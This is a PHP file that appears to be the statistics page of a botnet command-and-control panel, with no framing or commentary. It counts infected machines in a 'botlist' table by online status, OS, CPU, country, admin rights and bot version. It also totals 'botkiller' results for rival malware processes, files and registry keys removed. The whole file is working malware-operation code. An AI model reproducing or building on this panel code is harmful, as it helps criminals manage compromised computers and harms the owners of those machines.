<?php

	$STATS_TOTAL = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE 1;'));
	
	if($STATS_TOTAL > 0)
	{	
		$row = mysql_fetch_array(mysql_query('SELECT * FROM peaks WHERE 1 LIMIT 1;'));
		$PEAK_ALLTIME = htmlentities($row['alltime']);
		$PEAK_SEVENDAYS = htmlentities($row['sevendays']);
		$PEAK_TWENTYFOURHOURS = htmlentities($row['twentyfourhours']);
	
		$STATS_ALIVE = array();
		$STATS_ALIVE[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE lastseen >= \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\';'));
		$STATS_ALIVE[] = round($STATS_ALIVE[0] / $STATS_TOTAL * 100, 2);
	
		$STATS_DEAD = array();
		$STATS_DEAD[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE lastseen < \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\';'));
		$STATS_DEAD[] = round($STATS_DEAD[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_ONLINE = array();
		$STATS_ONLINE[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		$STATS_ONLINE[] = round($STATS_ONLINE[0] / $STATS_TOTAL * 100, 2);
	
		$STATS_OFFLINE = array();
		$STATS_OFFLINE[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE lastseen < \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\' AND lastseen >= \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\';'));
		$STATS_OFFLINE[] = round($STATS_OFFLINE[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_NEW = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE newbot = \'1\' AND lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		
		/*if($STATS_ONLINE[0] > $PEAK_ALLTIME)
		{
			mysql_query('UPDATE peaks SET `alltime` = \'' . $STATS_ONLINE[0] . '\' WHERE 1;');
		}
		
		if($STATS_ONLINE[0] > $PEAK_SEVENDAYS)
		{
			mysql_query('UPDATE peaks SET `sevendays` = \'' . $STATS_ONLINE[0] . '\' WHERE 1;');
		}
		
		if($STATS_ONLINE[0] > $PEAK_TWENTYFOURHOURS)
		{
			mysql_query('UPDATE peaks SET `twentyfourhours` = \'' . $STATS_ONLINE[0] . '\' WHERE 1;');
		}*/
		
		$STATS_32BIT = array();
		$STATS_32BIT[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE cpu=1;'));
		$STATS_32BIT[] = round($STATS_32BIT[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_64BIT = array();
		$STATS_64BIT[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE cpu=0;'));
		$STATS_64BIT[] = round($STATS_64BIT[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_NET = array();
		$STATS_NET[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE net!=\'N/A\';'));
		$STATS_NET[] = round($STATS_NET[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_NONET = array();
		$STATS_NONET[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE net=\'N/A\';'));
		$STATS_NONET[] = round($STATS_NONET[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_OS = mysql_query('SELECT os,count(id) AS \'amount\' FROM botlist WHERE 1 GROUP BY os;');
		$STATS_OPSYS = '';
		while($row = mysql_fetch_array($STATS_OS)) 
			$STATS_OPSYS .= '						<p><span>' . htmlentities($row['os']) . '</span>' . $row['amount'] . ' (' . round($row['amount'] / $STATS_TOTAL * 100, 2) . '%)</p>' . "\n";

		$STATS_DESKTOP = array();
		$STATS_DESKTOP[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE type=1;'));
		$STATS_DESKTOP[] = round($STATS_DESKTOP[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_LAPTOP = array();
		$STATS_LAPTOP[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE type=0;'));
		$STATS_LAPTOP[] = round($STATS_LAPTOP[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_ADMIN = array();
		$STATS_ADMIN[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE admin=1;'));
		$STATS_ADMIN[] = round($STATS_ADMIN[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_USER = array();
		$STATS_USER[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE admin=0;'));
		$STATS_USER[] = round($STATS_USER[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_BUSY = array();
		$STATS_BUSY[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE busy=1 AND lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		$STATS_BUSY[] = round($STATS_BUSY[0] / $STATS_ONLINE[0] * 100, 2);
		
		$STATS_FREE = array();
		$STATS_FREE[] = mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE busy=0 AND lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		$STATS_FREE[] = round($STATS_FREE[0] / $STATS_ONLINE[0] * 100, 2);
		
		$STATS_BOTKILLER = mysql_query('SELECT SUM(botskilled), SUM(files), SUM(regkey) FROM botlist WHERE 1;');
		$STATS_BOTKILLER = mysql_fetch_array($STATS_BOTKILLER);
		
		$STATS_PROC = $STATS_BOTKILLER[0];
		$STATS_FILE = $STATS_BOTKILLER[1];
		$STATS_REG = $STATS_BOTKILLER[2];
		
		$STATS_COUNTRY_REQ = mysql_query('SELECT country, count(id) AS \'amount\' FROM botlist WHERE 1 GROUP BY country;');
		$STATS_COUNTRY = '';
		while($row = mysql_fetch_array($STATS_COUNTRY_REQ)) 
			$STATS_COUNTRY .= '						<p><span>' . htmlentities($row['country']) . '</span>' . $row['amount'] . ' (' . round($row['amount'] / $STATS_TOTAL * 100, 2) . '%)</p>' . "\n";
		
		$STATS_VERSION_REQ = mysql_query('SELECT version, count(id) AS \'amount\' FROM botlist WHERE 1 GROUP BY version;');
		$STATS_VERSION = '';
		while($row = mysql_fetch_array($STATS_VERSION_REQ)) 
			$STATS_VERSION .= '						<p><span>' . htmlentities($row['version']) . '</span>' . $row['amount'] . ' (' . round($row['amount'] / $STATS_TOTAL * 100, 2) . '%)</p>' . "\n";
		
	}
	
?>